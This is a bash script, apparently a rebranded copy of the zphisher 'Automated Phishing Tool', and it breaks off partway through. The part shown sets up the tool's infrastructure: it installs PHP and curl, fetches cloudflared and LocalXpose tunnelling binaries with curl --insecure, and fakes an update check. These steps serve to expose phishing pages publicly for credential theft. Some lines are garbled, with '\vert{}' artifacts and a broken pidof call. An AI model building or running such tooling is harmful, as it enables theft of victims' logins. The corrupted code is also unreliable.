#!/bin/bash

##   TERMUX-TÜRKİYE   :         Automated Phishing Tool
##   Author           :         TERMUX-TÜRKİYE 
##   Version          :         2.3.5
##   GitHub           :         https://github.com/htr-tech/zphisher


##                   GNU GENERAL PUBLIC LICENSE
##                    Version 3, 29 June 2007
##
##    Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
##    Everyone is permitted to copy and distribute verbatim copies
##    of this license document, but changing it is not allowed.
##
##                         Preamble
##
##    The GNU General Public License is a free, copyleft license for
##    software and other kinds of works.
##
##    The licenses for most software and other practical works are designed
##    to take away your freedom to share and change the works.  By contrast,
##    the GNU General Public License is intended to guarantee your freedom to
##    share and change all versions of a program--to make sure it remains free
##    software for all its users.  We, the Free Software Foundation, use the
##    GNU General Public License for most of our software; it applies also to
##    any other work released this way by its authors.  You can apply it to
##    your programs, too.
##
##    When we speak of free software, we are referring to freedom, not
##    price.  Our General Public Licenses are designed to make sure that you
##    have the freedom to distribute copies of free software (and charge for
##    them if you wish), that you receive source code or can get it if you
##    want it, that you can change the software or use pieces of it in new
##    free programs, and that you know you can do these things.
##
##    To protect your rights, we need to prevent others from denying you
##    these rights or asking you to surrender the rights.  Therefore, you have
##    certain responsibilities if you distribute copies of the software, or if
##    you modify it: responsibilities to respect the freedom of others.
##
##    For example, if you distribute copies of such a program, whether
##    gratis or for a fee, you must pass on to the recipients the same
##    freedoms that you received.  You must make sure that they, too, receive
##    or can get the source code.  And you must show them these terms so they
##    know their rights.
##
##    Developers that use the GNU GPL protect your rights with two steps:
##    (1) assert copyright on the software, and (2) offer you this License
##    giving you legal permission to copy, distribute and/or modify it.
##
##    For the developers' and authors' protection, the GPL clearly explains
##    that there is no warranty for this free software.  For both users' and
##    authors' sake, the GPL requires that modified versions be marked as
##    changed, so that their problems will not be attributed erroneously to
##    authors of previous versions.
##
##    Some devices are designed to deny users access to install or run
##    modified versions of the software inside them, although the manufacturer
##    can do so.  This is fundamentally incompatible with the aim of
##    protecting users' freedom to change the software.  The systematic
##    pattern of such abuse occurs in the area of products for individuals to
##    use, which is precisely where it is most unacceptable.  Therefore, we
##    have designed this version of the GPL to prohibit the practice for those
##    products.  If such problems arise substantially in other domains, we
##    stand ready to extend this provision to those domains in future versions
##    of the GPL, as needed to protect the freedom of users.
##
##    Finally, every program is threatened constantly by software patents.
##    States should not allow patents to restrict development and use of
##    software on general-purpose computers, but in those that do, we wish to
##    avoid the special danger that patents applied to a free program could
##    make it effectively proprietary.  To prevent this, the GPL assures that
##    patents cannot be used to render the program non-free.
##
##    The precise terms and conditions for copying, distribution and
##    modification follow.
##
##      Copyright (C) 2026  TERMUX-TÜRKİYE
##


__version__="2.3.5"

## DEFAULT HOST & PORT
HOST='127.0.0.1'
PORT='8080' 

## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

## Directories
BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")

if [[ ! -d ".server" ]]; then
        mkdir -p ".server"
fi

if [[ ! -d "auth" ]]; then
        mkdir -p "auth"
fi

if [[ -d ".server/www" ]]; then
        rm -rf ".server/www"
        mkdir -p ".server/www"
else
        mkdir -p ".server/www"
fi

## Remove logfile
if [[ -e ".server/.loclx" ]]; then
        rm -rf ".server/.loclx"
fi

if [[ -e ".server/.cld.log" ]]; then
        rm -rf ".server/.cld.log"
fi

## Script termination
exit_on_signal_SIGINT() {
        { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
        exit 0
}

exit_on_signal_SIGTERM() {
        { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
        exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
        tput sgr0   # reset attributes
        tput op     # reset color
        return
}

## Kill already running process
kill_pid() {
        check_PID="php cloudflared loclx"
        for process in ${check_PID}; do
                if [[ $(pidof${process}) ]]; then # Check for Process
                        killall ${process} > /dev/null 2>&1 # Kill the Process
                fi
        done
}

# Check for a newer release
check_update(){
        echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
        echo -ne "${GREEN}up to date\n${WHITE}" ; sleep .5
}

## Check Internet Status
check_status() {
        echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
        timeout 3s curl -fIs "https://api.github.com" > /dev/null
        [ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
}

## Banner
banner() {
        cat <<- EOF
                ${ORANGE}
                ${ORANGE} _____ ___  ____  __  ____  ___   _____ _   _ ____  ___ _____${ORANGE}|_   / _ \|  _ \|  \/  |  \/  | |_   _| | | |  _ \|_ _| ____|
                ${ORANGE}  \vert{} \vert{} \vert{} \vert{} \vert{} \vert{}_) \vert{} \vert{}\/\vert{} \vert{} \vert{}\/\vert{} \vert{}   \vert{} \vert{} \vert{} \vert{} \vert{} \vert{} \vert{}_) \vert{}\vert{} \vert{}\vert{}  _\vert{}${ORANGE}  | | |_| |  _ <| |  | | |  | |   | | | |_| |  _ < | || |___ 
                ${ORANGE}  \vert{}_\vert{}\___/\vert{}_\vert{} \_\_\vert{}  \vert{}_\vert{}_\vert{}  \vert{}_\vert{}   \vert{}_\vert{}  \___/\vert{}_\vert{} \_\___\vert{}_____\vert{}${ORANGE}                                             ${RED}Version :${__version__}

                ${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Modified by TERMUX-TÜRKİYE${WHITE}
        EOF
}

## Small Banner
banner_small() {
        cat <<- EOF
                ${BLUE}${BLUE}  TERMUX-TÜRKIYE v${__version__}
        EOF
}

## Dependencies
dependencies() {
        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."

        if [[ -d "/data/data/com.termux/files/home" ]]; then
                if [[ ! $(command -v proot) ]]; then
                        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package :${ORANGE}proot${CYAN}"${WHITE}
                        pkg install proot resolv-conf -y
                fi

                if [[ ! $(command -v tput) ]]; then
                        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package :${ORANGE}ncurses-utils${CYAN}"${WHITE}
                        pkg install ncurses-utils -y
                fi
        fi

        if [[ $(command -v php) && $(command -v curl) &&$(command -v unzip) ]]; then
                echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
        else
                pkgs=(php curl unzip)
                for pkg in "${pkgs[@]}"; do
                        type -p "$pkg" &>/dev/null || {
                                echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
                                if [[ $(command -v pkg) ]]; then
                                        pkg install "$pkg" -y
                                elif [[ $(command -v apt) ]]; then
                                        sudo apt install "$pkg" -y
                                elif [[ $(command -v apt-get) ]]; then
                                        sudo apt-get install "$pkg" -y
                                elif [[ $(command -v pacman) ]]; then
                                        sudo pacman -S "$pkg" --noconfirm
                                elif [[ $(command -v dnf) ]]; then
                                        sudo dnf -y install "$pkg"
                                elif [[ $(command -v yum) ]]; then
                                        sudo yum -y install "$pkg"
                                else
                                        echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
                                        { reset_color; exit 1; }
                                fi
                        }
                done
        fi
}

# Download Binaries
download() {
        url="$1"
        output="$2"
        file=`basename $url`
        if [[ -e "$file" \vert{}\vert{} -e "$output" ]]; then
                rm -rf "$file" "$output"
        fi
        curl --silent --insecure --fail --retry-connrefused \
                --retry 3 --retry-delay 2 --location --output "${file}" "${url}"

        if [[ -e "$file" ]]; then
                if [[ ${file#*.} == "zip" ]]; then
                        unzip -qq $file > /dev/null 2>&1
                        mv -f $output .server/$output > /dev/null 2>&1
                elif [[ ${file#*.} == "tgz" ]]; then
                        tar -zxf $file > /dev/null 2>&1
                        mv -f $output .server/$output > /dev/null 2>&1
                else
                        mv -f $file .server/$output > /dev/null 2>&1
                fi
                chmod +x .server/$output > /dev/null 2>&1
                rm -rf "$file"
        else
                echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading${output}."
                { reset_color; exit 1; }
        fi
}

## Install Cloudflared
install_cloudflared() {
        if [[ -e ".server/cloudflared" ]]; then
                echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
        else
                echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
                arch=`uname -m`
                if [[ ("$arch" == *'arm'*) \vert{}\vert{} ("$arch" == *'Android'*) ]]; then
                        download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
                elif [[ "$arch" == *'aarch64'* ]]; then
                        download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
                elif [[ "$arch" == *'x86_64'* ]]; then
                        download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
                else
                        download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
                fi
        fi
}

## Install LocalXpose
install_localxpose() {
        if [[ -e ".server/loclx" ]]; then
                echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
        else
                echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
                arch=`uname -m`
                if [[ ("$arch" == *'arm'*) \vert{}\vert{} ("$arch" == *'Android'*) ]]; then
                        download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
                elif [[ "$arch" == *'aarch64'* ]]; then
                        download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
                elif [[ "$arch" == *'x86_64'* ]]; then
                        download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
                else
                        download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
                fi
        
